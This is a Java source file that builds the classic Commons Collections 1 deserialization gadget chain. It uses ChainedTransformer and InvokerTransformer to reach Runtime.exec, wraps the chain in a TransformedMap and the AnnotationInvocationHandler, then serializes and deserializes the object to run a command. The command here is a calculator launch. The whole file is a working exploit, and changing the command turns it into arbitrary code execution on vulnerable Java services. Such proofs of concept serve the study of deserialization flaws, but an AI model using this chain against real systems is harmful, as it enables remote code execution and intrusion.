package exp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class originalCC1 {
    public static void main(String[] args) throws Exception {
        String cmd = "/usr/bin/gnome-calculator";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // !
                new InvokerTransformer(
                        "getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap =new HashMap<>();
        hashMap.put("value","nonsense"); // ensure Map.Entry entry not empty
        Map<Object,Object> decoratedMap = (TransformedMap) TransformedMap.decorate(
                hashMap,null, chainedTransformer
        );

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Target.class,decoratedMap);

        serialize(o);
        deserialize("ser.bin");
    }
    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object deserialize(String fileName) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }

}
